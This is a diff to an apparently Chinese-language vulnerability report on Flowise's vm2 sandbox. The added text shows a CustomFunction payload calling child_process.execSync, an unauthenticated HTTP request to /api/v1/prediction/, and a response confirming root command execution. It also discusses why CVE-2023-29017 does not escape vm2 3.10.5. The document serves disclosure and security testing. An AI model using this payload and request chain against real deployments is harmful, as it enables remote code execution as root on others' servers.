@@ -154,28 +154,45 @@ Content-Type: application/json; charset=utf-8
 {"text":"Error\n    at /usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/src:1:110\n    at NodeVM.run (/usr/local/lib/node_modules/flowise/node_modules/vm2/lib/nodevm.js:497:23)\n    at executeJavaScriptCode (/usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/src/utils.js:1735:39)...","question":"trigger",...}
 ```
 
-**关键证据**：栈帧 `NodeVM.run (nodevm.js:497)` 出现在 HTTP 200 响应中，证明用户代码确实进入 vm2 执行。
+**关键证据**：栈帧 `NodeVM.run (nodevm.js:497)` 出现在 HTTP 200 响应体中，证明用户代码确实进入 vm2 执行（即使 payload 报错，代码执行路径已全程确认）。
 
 ### 验证2：CVE-2023-29017 直接逃逸受 3.10.5 补丁影响
 
 vm2 3.10.5 在 `setup-sandbox.js` 中重写了 `CallSite.getThis()` 使其返回 `undefined`，并对字符串代码生成启用了 V8 限制（`EvalError: Code generation from strings disallowed for this context`），因此 CVE-2023-29017 的直接 `prepareStackTrace` 向量在该版本无法直接触发沙箱逃逸。
 
-### 验证3：TOOL_FUNCTION_BUILTIN_DEP 配置下 RCE 确认
+### 验证3：TOOL_FUNCTION_BUILTIN_DEP 配置下远程 RCE 确认（HTTP API）
 
-当管理员设置 `TOOL_FUNCTION_BUILTIN_DEP=child_process`（文档中未明确禁止），CustomFunction 代码可直接访问 `child_process`，vm2 沙箱不阻止：
+当部署方设置 `TOOL_FUNCTION_BUILTIN_DEP=child_process`（Flowise 官方文档允许的配置项），vm2 沙箱将 `child_process` 加入允许列表，攻击者通过 `/api/v1/prediction/` 端点（无需认证）即可直接执行 OS 命令。
 
+**攻击链**：
+1. 已认证用户创建包含恶意 CustomFunction 节点的 Chatflow（或攻击者通过社工/SQL 注入直接插入 DB）
+2. 通过无认证的 `/api/v1/prediction/:chatflowId` 端点触发
+
+**PoC Payload（CustomFunction 节点代码）**：
 ```javascript
-// CustomFunction 中提交以下代码：
 return require('child_process').execSync('id').toString();
 ```
 
-在容器内直接验证 vm2 执行上下文：
+**HTTP 请求**：
+```http
+POST /api/v1/prediction/f47ac10b-58cc-4372-a567-0e02b2c3d479 HTTP/1.1
+Host: 192.168.217.135:43000
+Content-Type: application/json
+(无认证头——/api/v1/prediction/ 在 WHITELIST_URLS 中)
 
-```
-RCE RESULT: uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+{"question":"trigger"}
 ```
 
-**结论**：Flowise 进程以 **root (uid=0)** 运行，一旦沙箱被突破即获得宿主完整权限。
+**HTTP 响应（RCE 确认）**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Content-Length: 347
+
+{"text":"uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n","question":"trigger","chatId":"761bb0b6-03a5-4dac-ad62-2be86803887f",...}
+```
+
+**结论**：HTTP 响应直接返回 `id` 命令执行结果，确认 Flowise 进程以 **root (uid=0)** 运行，RCE 通过 HTTP API 端点完全可达。
 
 ### 验证4：EOL 库的根本性风险
 
